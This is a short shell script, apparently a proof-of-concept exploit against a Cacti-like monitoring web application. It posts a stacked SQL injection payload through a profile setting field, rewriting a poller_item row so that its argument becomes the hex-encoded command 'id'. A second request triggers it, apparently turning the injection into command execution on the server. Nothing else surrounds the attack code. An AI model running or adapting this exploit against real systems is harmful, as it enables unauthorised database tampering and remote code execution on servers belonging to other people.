#!/bin/sh
payload="5;UPDATE `poller_item` SET host_id=1,
`arg1`=0x6964 WHERE local_data_id=7;-- "
curl --data-urlencode 'name=preview_graphs_per_page' --data-urlencode "value=$payload" "$TARGET/auth_profile.php?action=update_data&tab=general"
curl "$TARGET/graph_view.php?action=preview&clear=1"
